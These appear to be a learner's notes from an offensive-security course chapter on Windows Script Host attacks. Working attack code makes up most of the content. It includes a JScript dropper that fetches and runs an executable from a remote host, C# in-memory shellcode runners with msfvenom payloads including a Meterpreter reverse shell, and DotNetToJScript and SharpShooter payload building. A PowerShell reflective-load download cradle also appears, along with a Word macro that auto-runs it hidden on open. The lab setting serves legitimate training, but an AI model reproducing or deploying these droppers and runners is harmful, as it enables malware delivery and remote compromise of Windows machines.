# chapter 4 client side code execution with windows script host

Jscript is a dialect of JavaScript developed and owned by Microsoft that is used in Internet 
Explorer. It can also be executed outside the browser through the Windows Script Host,
197 which 
can execute scripts in a variety of languages

in order to check execution we can see default application by file type.

### Execution of jscript on windows

Js script can be directly executed onwindows thats why they are important

As mentioned previously, executing Jscript outside the context of a web browser bypasses all 
security settings. This allows us to interact with the older ActiveX198 technology and the Windows 
Script Host engine itself. Let’s discuss what we can do with this combination.

As shown in the code in Listing 116, we can leverage ActiveX by invoking the ActiveXObject199
constructor by supplying the name of the object. We can then use WScript.Shell to interact with 
the Windows Script Host Shell to execute external Windows applications. For example, we can 
instantiate a Shell object named “shell” from the WScript.Shell class through the ActiveXObject
constructor to run cmd.exe through the Run command

Checking on windows 10 the extension  is jse

![](open_cmd.png)

### Exercises

1. Create a simple Jscript file that opens an application.

made at: open_application.jse

2. Look through the list of default applications related to file types. Are there any other 
interesting file types we could leverage?

- .msc
- .perl
- .VBE
- .vbs
- .WSF
- .WSH

3. The .vbs extension is also linked to the Windows Script Host format. Write a simple VBScript 
file to open an application

made at: open_chrome.vbs

### Jscript Meterpreter Dropper

creating a dropper to inject the payload into.

dropper.jse works but is detected as malicious.

```js
var url = "http://10.10.6.12/shell.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');
Object.Open('GET', url, false);
Object.Send();
if (Object.Status == 200)
{
 var Stream = WScript.CreateObject('ADODB.Stream');
 Stream.Open();
 Stream.Type = 1;
 Stream.Write(Object.ResponseBody);
 Stream.Position = 0;
 Stream.SaveToFile("met.exe", 2);
 Stream.Close();
}
var r = new ActiveXObject("WScript.Shell").Run("shell.exe");
```

### 4.1.2.1 Exercises
1. Replicate the Jscript file from this section.

done 
2. Modify the Jscript code to make it proxy-aware with the setProxy method. You can use the 
Squid proxy server installed on the Windows 10 development machine.

# Jscript and C#

Since there’s no known way to invoke the Win32 APIs directly from Jscript, we’ll instead embed a 
compiled C# assembly in the Jscript file and execute it. This will give us the same capabilities as 
PowerShell since we will have comparable access to the .NET framework. 

# introduction to visual studio

we need to connect our kali instance with window

install on kali

```
sudo apt install samba
sudo mv /etc/samba/smb.conf /etc/samba/smb.conf.old
sudo nano /etc/samba/smb.conf
```
add this in the conf file

```
[visualstudio]
path = /home/kali/data
browseable = yes
read only = no
```

we need to create a samba user that can access the share and then start when required.

```
sudo smbpasswd -a kali
```

starting the samba server

```
sudo systemctl start smbd
sudo systemctl start nmbd
```
make a shared folder and open up the permissions for visual studio

```
mkdir /home/kali/data
chmod -R 777 /home/kali/data
```

With everything set up, we’ll turn to our Windows 10 development machine. First, we’ll open the 
new share in File Explorer (\\192.168.119.120 in our case). When prompted, we’ll enter the 
username and password of the newly created SMB user and select the option to store the 
credentials.

Staring a simple helloworld application

select visual studio
create new project
language select C#
use console app(.Net framework)

opening the app we see

```C#
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
namespace ConsoleApp1
{
 class Program
 {
 static void Main(string[] args)
 {  
    console.WriteLine("Hello world");
 }
 }
}
```

### 4.2.1.1 Exercises
1. Set up the Samba share on your Kali system as shown in this section.

![](samba.png)

   
2. Create a Visual Studio project and follow the steps to compile and execute the “Hello World” application.


```
Hello World!

C:\Users\HP\source\repos\JscriptHelloWorld\bin\Debug\net5.0\JscriptHelloWorld.exe (process 7148) exited with code 0.
To automatically close the console when debugging stops, enable Tools->Options->Debugging->Automatically close the console when debugging stops.
Press any key to close this window . . .

```

# Using DotNetToJsScript

downloading DotNetTojscript
using https://github.com/tyranid/DotNetToJScript


looking into the project using vs studio, we see that 
Jscript will eventually execute the content of the TestClass method, which is inside the TestClass
class. In this case, we are simply executing the MessageBox.Show220 method.

Notice that the Solution Explorer lists a second project (DotNetToJscript) that converts the 
assembly into a format that Jscript can execute.

after using relaese/build we find that we need DotNetToJscript.exe , NDesk.Options.dll and Exampleassembly.dll in order to rn the DotnetToJscript program.

we can use the script as -

DotNettoJScript.exe ExampleAssembly.dll --lanf=Jscript --ver=v4 -o demo.js.

![](./DotnetTojs.png)


using dotnettojs script we an execute any arbritary C# script as JSScript


But when using jscript I get the following message:

```
C:\Users\misthios\codeplay\pen300\book\chapter4>DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js
This tool should only be run on v2 of the CLR

C:\Users\misthios\codeplay\pen300\book\chapter4>csc
Microsoft (R) Visual C# Compiler version 4.8.4084.0
for C# 5
Copyright (C) Microsoft Corporation. All rights reserved.

This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240

warning CS2008: No source files specified
error CS1562: Outputs without source must have the /out option specified
```

looking further at my configuration

```
PS C:\Users\misthios\codeplay\pen300\book\chapter4> $PSVersionTable
>>

Name                           Value
----                           -----
PSVersion                      5.1.19041.1682
PSEdition                      Desktop
PSCompatibleVersions           {1.0, 2.0, 3.0, 4.0...}
BuildVersion                   10.0.19041.1682
CLRVersion                     4.0.30319.42000
WSManStackVersion              3.0
PSRemotingProtocolVersion      2.3
SerializationVersion           1.1.0.1

```

after that the chapter goes into detals regarding dotnettojscript.


## Problem face while installing was solved by

getting the dotnetto js script binaries from the release and then just building exampleassembly downloading from the github.



### 4.2.2.1 Exercises
1. Set up the DotNetToJscript project, share it on the Samba share, and open it in Visual Studio.
   
2. Compile the default ExampleAssembly project and convert it into a Jscript file with 
DotNetToJscript.

![](release_loading.png)

3. Modify the TestClass.cs file to make it launch a command prompt instead of opening a 
MessageBox


```
 string command = "notepad.exe";
 Process.Start("cmd.exe", "/C" + command);
```
works

## using win32 api on C#

it work in a C# project

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;
namespace ConsoleApp1
{
    class Program
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int MessageBox(IntPtr hWnd, String text, String caption,
       int options);
        static void Main(string[] args)
        {
            MessageBox(IntPtr.Zero, "This is my text", "This is my caption", 0);
        }
    }
}
```

![](chash.png)

# shellcode runner in C#

we will be using virtualalloc, createhtread and wait for single object to execute shellcode in memory

```
└$ msfvenom -p windows/x64/exec CMD=calc.exe -b "x00" -f csharp
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
Found 3 compatible encoders
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=273, char=0x78)
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 319 (iteration=0)
x64/xor chosen with final size 319
Payload size: 319 bytes
Final size of csharp file: 1648 bytes
byte[] buf = new byte[319] {
0x48,0x31,0xc9,0x48,0x81,0xe9,0xdd,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,0xff,
0xff,0xff,0x48,0xbb,0xff,0xdd,0x1e,0x63,0xf6,0x92,0x0d,0xf8,0x48,0x31,0x58,
0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0x03,0x95,0x9d,0x87,0x06,0x7a,
0xcd,0xf8,0xff,0xdd,0x5f,0x32,0xb7,0xc2,0x5f,0xa9,0xa9,0x95,0x2f,0xb1,0x93,
0xda,0x86,0xaa,0x9f,0x95,0x95,0x31,0xee,0xda,0x86,0xaa,0xdf,0x95,0x95,0x11,
0xa6,0xda,0x02,0x4f,0xb5,0x97,0x53,0x52,0x3f,0xda,0x3c,0x38,0x53,0xe1,0x7f,
0x1f,0xf4,0xbe,0x2d,0xb9,0x3e,0x14,0x13,0x22,0xf7,0x53,0xef,0x15,0xad,0x9c,
0x4f,0x2b,0x7d,0xc0,0x2d,0x73,0xbd,0xe1,0x56,0x62,0x26,0x19,0x8d,0x70,0xff,
0xdd,0x1e,0x2b,0x73,0x52,0x79,0x9f,0xb7,0xdc,0xce,0x33,0x7d,0xda,0x15,0xbc,
0x74,0x9d,0x3e,0x2a,0xf7,0x42,0xee,0xae,0xb7,0x22,0xd7,0x22,0x7d,0xa6,0x85,
0xb0,0xfe,0x0b,0x53,0x52,0x3f,0xda,0x3c,0x38,0x53,0x9c,0xdf,0xaa,0xfb,0xd3,
0x0c,0x39,0xc7,0x3d,0x6b,0x92,0xba,0x91,0x41,0xdc,0xf7,0x98,0x27,0xb2,0x83,
0x4a,0x55,0xbc,0x74,0x9d,0x3a,0x2a,0xf7,0x42,0x6b,0xb9,0x74,0xd1,0x56,0x27,
0x7d,0xd2,0x11,0xb1,0xfe,0x0d,0x5f,0xe8,0xf2,0x1a,0x45,0xf9,0x2f,0x9c,0x46,
0x22,0xae,0xcc,0x54,0xa2,0xbe,0x85,0x5f,0x3a,0xb7,0xc8,0x45,0x7b,0x13,0xfd,
0x5f,0x31,0x09,0x72,0x55,0xb9,0xa6,0x87,0x56,0xe8,0xe4,0x7b,0x5a,0x07,0x00,
0x22,0x43,0x2b,0x4c,0x93,0x0d,0xf8,0xff,0xdd,0x1e,0x63,0xf6,0xda,0x80,0x75,
0xfe,0xdc,0x1e,0x63,0xb7,0x28,0x3c,0x73,0x90,0x5a,0xe1,0xb6,0x4d,0x62,0xb8,
0x5a,0xa9,0x9c,0xa4,0xc5,0x63,0x2f,0x90,0x07,0x2a,0x95,0x9d,0xa7,0xde,0xae,
0x0b,0x84,0xf5,0x5d,0xe5,0x83,0x83,0x97,0xb6,0xbf,0xec,0xaf,0x71,0x09,0xf6,
0xcb,0x4c,0x71,0x25,0x22,0xcb,0x00,0x97,0xfe,0x6e,0xd6,0x9a,0xa5,0x7b,0x63,
0xf6,0x92,0x0d,0xf8 };

```

The csharp library imports 

```C#
[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint 
flAllocationType, 
 uint flProtect);
[DllImport("kernel32.dll")]
static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, 
 IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr 
lpThreadId);
[DllImport("kernel32.dll")]
static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds)
```

in main

```csharp
byte[] buf = new byte[626] {
 0xfc,0x48,0x83,0xe4,0xf0,0xe8...
int size = buf.Length;
IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
Marshal.Copy(buf, 0, addr, size);
IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
WaitForSingleObject(hThread, 0xFFFFFFFF)
```

FULL PROGRAM

```c#
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;
namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint
       flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
       IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32
       dwMilliseconds);
        static void Main(string[] args)
        {
            byte[] buf = new byte[319] {
                0x48,0x31,0xc9,0x48,0x81,0xe9,0xdd,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,0xff,
                0xff,0xff,0x48,0xbb,0xff,0xdd,0x1e,0x63,0xf6,0x92,0x0d,0xf8,0x48,0x31,0x58,
                0x........,0x22,0xcb,0x00,0x97,0xfe,0x6e,0xd6,0x9a,0xa5,0x7b,0x63,
                0xf6,0x92,0x0d,0xf8 };
            int size = buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, size);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0,
IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

# modifying for jscript runner

```C#
using System;

using System.Diagnostics;
using System.Runtime.InteropServices;


[ComVisible(true)]
public class TestClass
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
    IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    public TestClass()
    {
        byte[] buf = new byte[319] {
            0x48,0x31,0xc9,0x48,0x81,0xe9,0xdd,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,0xff,
            0xff,0xff,0x48,0xbb,0xff,0xdd,0x1e,0x63,0xf6,0x92,0x0d,0xf8,0x48,0x31,0x58,
           ......0xcb,0x4c,0x71,0x25,0x22,0xcb,0x00,0x97,0xfe,0x6e,0xd6,0x9a,0xa5,0x7b,0x63,
            0xf6,0x92,0x0d,0xf8 };

        int size = buf.Length;
        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
        Marshal.Copy(buf, 0, addr, size);
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0,
       IntPtr.Zero);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }

    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}

```

![](./jscript_runnner.png)

### 4.2.5.1 Exercises
1. Recreate the steps to obtain a Jscript shellcode runner.

2. Use DotNetToJscript to obtain a shellcode runner in VBScript format.
```
DotNetToJScript.exe ExampleAssembly.dll --lang=vbscript --ver=v4 -o demo1.vbs
```

# Sharpshooter

SharpShooter is “a payload creation framework for the retrieval and execution of arbitrary C# 
source code”227 and automates part of the process discussed in this module. As with any 
automated tool, it is vital that we understand how it works, especially when it comes to bypassing 
security software and mitigations that will be present in most organizations

installing

```
sudo git clone https://github.com/mdsecactivebreach/SharpShooter.git 

```

hosting the payload

```
┌──(kali㉿kali)-[~/Downloads/SharpShooter]
└─$ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.6.12 LPORT=4444 -f raw -o /var/www/html/shell.txt        
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 679 bytes
Saved as: /var/www/html/shell.txt

```

trying to run sharpshooter

```
ython SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile /var/www/html/shell.txt --output test

       _____ __                    _____ __                __           
      / ___// /_  ____ __________ / ___// /_  ____  ____  / /____  _____
      \__ \/ __ \/ __ `/ ___/ __ \__ \/ __ \/ __ \/ __ \/ __/ _ \/ ___/
     ___/ / / / / /_/ / /  / /_/ /__/ / / / / /_/ / /_/ / /_/  __/ /    
    /____/_/ /_/\__,_/_/  / .___/____/_/ /_/\____/\____/\__/\___/_/     
                         /_/                                            

     Dominic Chell, @domchell, MDSec ActiveBreach, v2.0
    
'utf-8' codec can't decode byte 0xfc in position 0: invalid start byte

[!] Incorrect choice

```

sharpshooter not able to take the payload

### 4.2.6.1 Exercises
1. Install SharpShooter on Kali and generate a Jscript shellcode runner.
2. Expand on the attack by creating a staged attack229 that also leverages HTML smuggling to 
deliver the malicious Jscript file

# In memory PowerSHell Revisited

We developed powerful tradecraft With Windows Script Host and C#. Let’s go back and combine 
that with our PowerShell and Office tradecraft from the previous module to develop another way 
of executing C# code entirely in memory.

### Reflective Load

created a class library in vs studio project based on previous C# code.

```C#
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace ClassLibrary1
{
    public class Class1
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint
        flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
       IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32
       dwMilliseconds);

        public static void runner()
        {
            byte[] buf = new byte[319] {
                0x48,0x31,0xc9,0x48,0x81,0xe9,0xdd,
                .....
                0xf6,0x92,0x0d,0xf8 };
            int size = buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, size);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0,
IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}

```

after create CLassLibrary1.dll and hosting it, we have

```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://localhost/ClassLibrary1.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```

powershell closes but the calculator opens.


### 4.3.1.1 Exercises
1. Build the C# project and compile the code in Visual Studio.

![](ps1_cradle.png)

2. Perform the dynamic load of the assembly through the download cradle both using LoadFile
and Load (Remember to use a 64-bit PowerShell ISE console).

could not use loadfile 

```

PS C:\Windows\system32\WindowsPowerShell\v1.0> C:\Users\misthios\Documents\cradle_for_csharp.ps1
Exception calling "Load" with "1" argument(s): "Could not load file or assembly 'C:\\Users\\misthios\\Downloads\\ClassLibrary1.dll' or one of its dependencies. The given assembly name or codebase was invalid. 
(Exception from HRESULT: 0x80131047)"
```

3. Using what we have learned in these two modules, modify the C# and PowerShell code and
use this technique from within a Word macro. Remember that Word runs as a 32-bit
process.

```vb
Sub MyMacro()
 Dim str As String
 str = "powershell (New-Object System.Net.WebClient).DownloadString('http://localhost/cradle.txt') | IEX"
 'str = "calc.exe"
 Shell str, vbHide
End Sub
Sub Document_Open()
 MyMacro
End Sub
Sub AutoOpen()
 MyMacro
End Sub

```

cradle contains

```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://localhost/ClassLibrary1.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```


class library is loaded from above 


```C#
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace ClassLibrary1
{
    public class Class1
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint
        flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
       IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32
       dwMilliseconds);

        public static void runner()
        {
            byte[] buf = new byte[319] {
                0x48,0x31,0xc9,0x48,0x81,0xe9,0xdd,
                .....
                0xf6,0x92,0x0d,0xf8 };
            int size = buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, size);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0,
IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

problem: cant host powershell script in iis

![](./cant_serve_ps.png)

so changed into text now working

![](./calc_from_word_macro.png)





